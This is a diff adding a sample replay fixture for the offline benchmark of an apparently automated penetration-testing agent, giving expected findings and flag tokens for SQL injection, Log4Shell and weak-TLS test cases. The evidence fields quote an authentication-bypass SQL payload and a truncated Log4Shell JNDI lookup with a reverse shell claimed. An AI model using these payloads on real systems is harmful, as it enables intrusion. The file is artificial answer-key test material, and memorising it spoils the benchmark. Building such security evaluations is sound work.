@@ -1,0 +1,25 @@
+{
+  "_comment": "Sample REPLAY transcript for the offline benchmark path (Gap #6). Keys are case ids; values are the {findings, flags_found, loot, flags} ARGUS would produce. Flag tokens here use the nonce 'baseline' (catalog flag + '-baseline') so they match run_benchmark(nonce='baseline'). web-sqli-001 + net-cve-log4shell-001 are exploited (flag present); net-tls-weak-001 is detected (TLS finding, no flag); web-idor-001 + ai-promptinj-001 are intentionally absent → skipped, exercising the skip path.",
+  "web-sqli-001": {
+    "flags_found": ["ARGUS_EVAL{web-sqli-001-baseline}"],
+    "findings": [
+      {"title": "SQL injection in login form", "severity": "high", "cves": [],
+       "evidence": "payload ' OR '1'='1'-- bypassed authentication; admin panel reached"}
+    ]
+  },
+  "net-cve-log4shell-001": {
+    "flags_found": [],
+    "flags": [{"flag_type": "root", "value": "ARGUS_EVAL{net-cve-log4shell-001-baseline}"}],
+    "findings": [
+      {"title": "Log4Shell remote code execution", "severity": "critical",
+       "cves": ["CVE-2021-44228"], "evidence": "JNDI lookup ${jndi:ldap://...} executed; reverse shell obtained"}
+    ]
+  },
+  "net-tls-weak-001": {
+    "flags_found": [],
+    "findings": [
+      {"title": "Weak TLS configuration: expired certificate", "severity": "low",
+       "cves": [], "evidence": "certificate expired 2019-04-01; TLS 1.0 enabled"}
+    ]
+  }
+}
